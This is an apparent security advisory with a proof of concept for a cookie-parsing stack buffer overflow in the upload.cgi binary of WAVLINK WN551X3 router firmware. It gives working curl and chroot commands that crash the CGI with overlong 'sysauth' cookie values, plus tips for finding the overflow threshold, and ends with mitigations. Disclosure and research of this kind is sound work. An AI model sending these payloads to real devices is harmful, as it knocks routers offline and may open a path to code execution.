# WAVLINK WN551X3 `upload.cgi` Stack-Based Buffer Overflow

## Overview
- Device/Firmware: WAVLINK WN551X3 / M51X3 (sample: `WAVLINK_WN551X3_M51X3_V240411-WO-d2241d0.bin`)
- Component: `/etc/lighttpd/www/cgi-bin/upload.cgi`
- Vulnerability: Stack-based buffer overflow when parsing `HTTP_COOKIE` and copying a cookie value into a fixed-size stack buffer without bounds checking.
- Impact:
  - Denial of Service (DoS): `upload.cgi` crashes with `SIGSEGV`.
  - Potential for code execution depending on stack layout and mitigations.
- Root cause: An overly long cookie value (e.g., `sysauth`) is copied into a fixed-size buffer using unsafe routines (likely `strcpy`/`sprintf`), causing overflow.

> Note: The binary is stripped in the firmware. The behavior and crash evidence strongly indicate an unsafe copy of cookie data into a stack buffer.

---

## Affected Path and Trigger Surface
- Binary: `/etc/lighttpd/www/cgi-bin/upload.cgi`
- Trigger surface:
  - Reads `HTTP_COOKIE` (from the HTTP `Cookie:` header).
  - Parses a target cookie key and copies its value into a fixed-size stack buffer without length checks.
- Observed behaviors:
  - Direct execution with `HTTP_COOKIE` injected causes `SIGSEGV` (exit code `139`) and kernel logs indicate `Comm: upload.cgi`.
  - HTTP path sometimes returns `200 OK` with `application/octet-stream` and a fixed `Content-Length` (e.g., `12283`) when not entering the vulnerable branch. Hitting the vulnerable branch leads to connection resets or 5xx.

---

## Environment
- Tested under WSL2 Ubuntu with `qemu-aarch64-static`, `busybox`, and built-in `uhttpd`.
- Ensure the CGI is executable:
```bash
chmod +x /path/to/chroot/etc/lighttpd/www/cgi-bin/upload.cgi
```
- Start a minimal HTTP server within the chroot and map `/cgi-bin`:
```bash
sudo chroot /path/to/chroot ./qemu-aarch64-static /usr/sbin/uhttpd -p 8080 -h / -x /cgi-bin=/etc/lighttpd/www/cgi-bin
```

---

## Proof of Concept (PoC)

### PoC A: Direct execution with `HTTP_COOKIE` injection
1. Generate an overlong cookie value:
```bash
COOKIE=$(python3 -c "print('A'*300)")
```

2. Execute the CGI with `HTTP_COOKIE` set:
```bash
sudo chroot /path/to/chroot ./qemu-aarch64-static /bin/busybox env HTTP_COOKIE="sysauth=$COOKIE" /etc/lighttpd/www/cgi-bin/upload.cgi
```

3. Check exit code for `SIGSEGV`:
```bash
echo $?
```

4. Confirm kernel logs show a crash:
```bash
dmesg | tail -n 50
```

Expected:
- QEMU prints `uncaught target signal 11 (Segmentation fault)`.
- Exit code is `139`.
- `dmesg` contains entries like:
  - `Comm: upload.cgi ... potentially unexpected fatal signal 11`

---

### PoC B: HTTP-triggered crash via cookie
1. Generate an overlong cookie value (try 256 or 300):
```bash
COOKIE=$(python3 -c "print('A'*256)")
```

2. Send a POST request with the cookie to the CGI (disable proxies to avoid `502` via local proxy):
```bash
curl --noproxy '*' -v -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: sysauth=$COOKIE" --data 'x=1' http://127.0.0.1:8080/cgi-bin/upload.cgi
```

3. Check kernel logs for a crash:
```bash
dmesg | tail -n 50
```

Expected:
- On success, the connection may be reset (`Empty reply`), or a `500`/`502` may be returned.
- `dmesg` contains `Comm: upload.cgi` with `fatal signal 11`.

Notes:
- If you consistently get `HTTP/1.1 200 OK` with `Content-Type: application/octet-stream` and fixed `Content-Length` (e.g., `12283`), the request path did not enter the vulnerable branch. Try:
  - Alternate cookie keys seen in similar firmware (e.g., `token`, `session`, `stok`, `lang`) instead of `sysauth`.
  - `multipart/form-data` upload path:
```bash
curl --noproxy '*' -v -H "Cookie: sysauth=$COOKIE" -F file=@/etc/hosts http://127.0.0.1:8080/cgi-bin/upload.cgi
```

---

## Verification Artifacts
- Kernel log excerpt (indicative):
  - `Comm: upload.cgi Not tainted ...`
  - `potentially unexpected fatal signal 11`
- QEMU message:
  - `qemu: uncaught target signal 11 (Segmentation fault)`
- Process exit:
  - `echo $?` → `139`

---

## Trigger Threshold
- Typical stack buffer sizes in router CGIs are 128/192/256 bytes.
- Test multiple lengths to identify the threshold:
```bash
COOKIE=$(python3 -c "print('A'*200)")
```
```bash
COOKIE=$(python3 -c "print('A'*256)")
```
```bash
COOKIE=$(python3 -c "print('A'*300)")
```
- If `200` is safe but `256/300` crash, the buffer is likely ≈256 bytes.

---

## Mitigation
- Replace unsafe copy routines:
  - `strcpy/sprintf` → `strlcpy/snprintf`, or `memcpy` with explicit bounds.
- Enforce maximum length checks on decoded cookie values.
- Strictly validate authentication cookie formats (e.g., `sysauth`, `token`).
- Compile-time hardening: `-fstack-protector`, PIE, RELRO, Fortify.

---

## Disclaimer
This PoC is for security research and education only. Do not test on production devices without authorization. Crashes may cause service disruption—test in an isolated environment.

---

## Appendix: Tips and Troubleshooting
- Disable local proxy for `curl`:
```bash
curl --noproxy '*'
```
- Confirm `/cgi-bin` mapping:
```bash
sudo chroot /path/to/chroot ./qemu-aarch64-static /usr/sbin/uhttpd -p 8080 -h / -x /cgi-bin=/etc/lighttpd/www/cgi-bin
```
- Inspect strings in the binary to discover cookie keys:
```bash
sudo chroot /path/to/chroot ./qemu-aarch64-static /bin/busybox strings /etc/lighttpd/www/cgi-bin/upload.cgi | grep -i -E 'cookie|sysauth|token|session|lang|stok|strcpy'
```
